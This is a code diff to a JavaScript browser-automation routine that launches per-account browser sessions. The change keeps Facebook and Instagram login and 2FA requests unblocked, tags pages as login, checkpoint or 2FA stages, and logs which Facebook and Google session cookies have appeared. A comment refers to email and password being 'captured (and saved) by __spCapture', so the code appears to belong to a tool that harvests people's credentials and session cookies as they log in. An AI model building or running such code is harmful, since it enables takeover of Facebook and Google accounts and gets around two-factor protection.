@@ -402,12 +402,11 @@ async function launch(accountId, adminIp) {
       /facebook\.com\/.*\/qpl\//,
       /facebook\.com\/.*\/ls_report/,
       /facebook\.com\/.*\/ajax\/bz/,
-      /facebook\.com\/.*\/graphqlbatch/,   // BLOKUJ ponownie — ale SAFE ZONE wyłapie login flow
+      // NIE blokuj graphqlbatch — FB flow logowania/2FA jedzie przez niego
       /connect\.facebook\.net/,
       /falco\.facebook/,
-      // Instagram
+      // Instagram — też NIE blokuj graphql/batch
       /instagram\.com\/.*\/logging/,
-      /instagram\.com\/graphql\/batch/,
       // Google telemetria (NIE Gmail)
       /google-analytics\.com/,
       /googletagmanager\.com/,
@@ -451,21 +450,54 @@ async function launch(accountId, adminIp) {
   // credentials. Dropped.
   const LOGIN_COOKIE_NAMES = ['c_user', '__Secure-1PSID', '__Secure-3PSID'];
   let notifiedLogin = false;
+  // Trackuj stan flow logowania — pozwala pokazać w logach gdzie
+  // zalicza się strona i czym się różni od poprzedniej nawigacji.
+  let lastNavUrl = '';
+  let lastCookieSummary = '';
   page.on('framenavigated', (frame) => {
     if (frame !== page.mainFrame()) return;
-    pushLog(accountId, 'nav', frame.url());
+    const url = frame.url();
+    pushLog(accountId, 'nav', url);
+    console.log(`[flow:${accountId}] nav → ${url}`);
+    lastNavUrl = url;
+
+    // Diagnostyka: które z 2FA/login markers widzimy w URL i tytule
+    page.title().then((title) => {
+      const hints = [];
+      if (/checkpoint/.test(url)) hints.push('CHECKPOINT');
+      if (/two_factor|two[-_ ]step|totp|otp/.test(url)) hints.push('2FA');
+      if (/login/.test(url)) hints.push('LOGIN');
+      if (/approvals/.test(url)) hints.push('APPROVALS');
+      if (hints.length) {
+        console.log(`[flow:${accountId}] STAGE: ${hints.join(',')} | title=${title.slice(0, 100)}`);
+        pushLog(accountId, 'nav', `📍 ${hints.join(',')}: ${title.slice(0, 80)}`);
+      }
+    }).catch(() => {});
+
     if (notifiedLogin) return;
     context.cookies().then(async (cookies) => {
+      // Diagnostyka cookies — pokaż które login cookies są obecne
+      const relevantCookies = cookies
+        .filter((c) => LOGIN_COOKIE_NAMES.includes(c.name) || /^(datr|sb|xs|fr|wd|presence)$/.test(c.name))
+        .map((c) => `${c.name}=${(c.value || '').length}ch`)
+        .sort().join(',');
+      if (relevantCookies !== lastCookieSummary) {
+        console.log(`[flow:${accountId}] cookies: ${relevantCookies || '(none)'}`);
+        lastCookieSummary = relevantCookies;
+      }
+
       // Each login cookie has its own min length — Google PSID is a long
       // opaque token (50+ chars), while Facebook's c_user is just a
       // numeric user id (10-18 digits). One global threshold would miss FB.
       const minLen = { c_user: 6, '__Secure-1PSID': 30, '__Secure-3PSID': 30 };
-      const loggedIn = cookies.some((c) => {
+      const match = cookies.find((c) => {
         if (!LOGIN_COOKIE_NAMES.includes(c.name)) return false;
         const need = minLen[c.name] ?? 10;
         return (c.value || '').length >= need;
       });
+      const loggedIn = Boolean(match);
       if (!loggedIn) return;
+      console.log(`[flow:${accountId}] 🎯 LOGIN DETECTED via ${match.name} (${(match.value || '').length}ch)`);
       notifiedLogin = true;
       // Re-fetch the account — email/password may have been captured (and
       // saved) by __spCapture after launch() first read it, so the closure's
